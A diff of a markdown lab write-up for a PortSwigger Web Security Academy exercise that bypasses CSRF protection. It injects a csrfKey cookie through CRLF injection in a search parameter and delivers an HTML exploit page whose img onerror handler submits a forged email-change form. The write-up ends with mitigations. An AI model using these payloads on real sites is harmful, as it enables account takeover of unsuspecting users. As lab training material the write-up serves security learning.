@@ -5,75 +5,101 @@ CSRF where token is tied to non-session cookie
 Cross-Site Request Forgery (CSRF) – Token Tied to Non-Session Cookie
 
 ## Objective
-Exploit a CSRF vulnerability by injecting a matching CSRF cookie and token to change the victim's email address.
+Exploit the CSRF protection by injecting an attacker-controlled csrfKey cookie and use it to change the victim's email address.
 
 ## Entry Point
-Change Email functionality
+Change Email functionality and Search functionality
 
 ## Exploitation Type
-Cross-Site Request Forgery (CSRF)
+Cross-Site Request Forgery (CSRF) / Cookie Injection
 
 ## Methodology
-1. Open the lab and log in using the provided credentials
+1. Open Burp's browser and log in using the provided user credentials.
 
-2. Navigate to the "My Account" page
+2. Navigate to the **My Account** page and submit the **Update email** form.
 
-3. Change the email address and intercept the request using Burp Suite
+3. Intercept the request using **Burp Suite Proxy** and send it to **Burp Repeater**.
 
-4. Observe that the application uses a CSRF token that is tied to a csrf cookie instead of the user's session
+4. Observe that changing the **session** cookie logs you out, while changing only the **csrfKey** cookie causes the CSRF token validation to fail. This indicates that the **csrfKey** cookie is not tied to the user session.
 
-5. Verify that both the csrf cookie and csrf parameter contain the same value
+5. Open an **Incognito** browser window and log in using the second account.
 
-6. Create a CSRF exploit that injects a custom csrf cookie into the victim's browser
+6. Submit another **Update email** request and send it to **Burp Repeater**.
 
-7. Include the same value in the csrf parameter of the forged request
+7. Replace the **csrfKey** cookie and **csrf** parameter with the values copied from the first account.
 
-8. Upload the exploit to the Exploit Server
+8. Observe that the request is accepted, confirming that the CSRF token is validated only against the **csrfKey** cookie and not the authenticated session.
 
-9. Deliver the exploit to the victim
+9. Close the Incognito browser.
 
-10. When the victim visits the malicious page, the browser sets the attacker-controlled csrf cookie and submits the forged request with the matching token
+10. Back in the original browser, perform any search request and intercept it.
 
-11. Observe that the victim's email address is changed successfully, solving the lab
+11. Observe that the search parameter is reflected inside the **Set-Cookie** response header, allowing cookie injection via CRLF injection.
+
+12. Create the following URL using your own **csrfKey** value:
+
+```
+/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None
+```
+
+13. Generate a **CSRF PoC** from the email change request using Burp Suite.
+
+14. Upload the exploit to the **Exploit Server**.
+
+15. Remove the auto-submit script and add the following image tag before the form submission to inject the attacker's **csrfKey** cookie:
+
+```html
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```
+
+16. Modify the email address in the exploit to an attacker-controlled email address.
+
+17. Store the exploit and click **Deliver to victim**.
+
+18. When the victim visits the exploit page, the malicious image injects the attacker's **csrfKey** cookie into the victim's browser. The form is then automatically submitted with the matching CSRF token, causing the email address to be changed successfully and solving the lab.
 
 ## Payload Used
+
+### Cookie Injection URL
+
+```text
+/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None
+```
+
+### Exploit
 
 ```html
 <html>
   <body>
-    <script>
-      document.cookie="csrf=nd1b1YJVa4oEkqrVZJzXEUv2rSXpBdyk";
-    </script>
 
-    <form action="https://0a43004603b8997b809e218b00e200c5.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="xyz@gmail.com">
-      <input type="hidden" name="csrf" value="nd1b1YJVa4oEkqrVZJzXEUv2rSXpBdyk">
+    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None"
+         onerror="document.forms[0].submit()">
+
+    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@example.com">
+      <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
     </form>
 
-    <script>
-      document.forms[0].submit();
-    </script>
   </body>
 </html>
 ```
 
 ## Result
-Successfully bypassed the CSRF protection by supplying a matching attacker-controlled CSRF cookie and token, resulting in an unauthorized email change.
+Successfully injected an attacker-controlled **csrfKey** cookie into the victim's browser and bypassed the CSRF protection, allowing an unauthorized email change.
 
 ## Impact
 - Unauthorized account modifications
-- Bypass of CSRF protection
+- CSRF protection bypass
 - User impersonation
 - Account takeover opportunities
 - Sensitive information modification
 
 ## Mitigation
-- Bind CSRF tokens to the authenticated user's session
-- Do not rely on non-session cookies for CSRF validation
-- Generate unique, unpredictable CSRF tokens
-- Validate Origin and Referer headers
-- Use SameSite cookies for additional protection
+- Bind CSRF tokens to the authenticated user's session.
+- Do not validate CSRF tokens using client-controlled cookies.
+- Prevent CRLF injection and HTTP response splitting.
+- Sanitize user input before reflecting it into HTTP headers.
+- Validate Origin and Referer headers in addition to CSRF tokens.
 
 ## Learning
-CSRF tokens should always be bound to the authenticated user's session.
-If the application validates only that the CSRF token matches a non-session cookie, attackers can inject both values and bypass the protection completely.
+CSRF tokens should always be tied to the authenticated user's session. In this lab, the application validated the CSRF token only against a non-session cookie, allowing an attacker to inject a matching **csrfKey** cookie using a CRLF injection vulnerability. By controlling both the cookie and the CSRF token, the attacker successfully bypassed the CSRF protection.
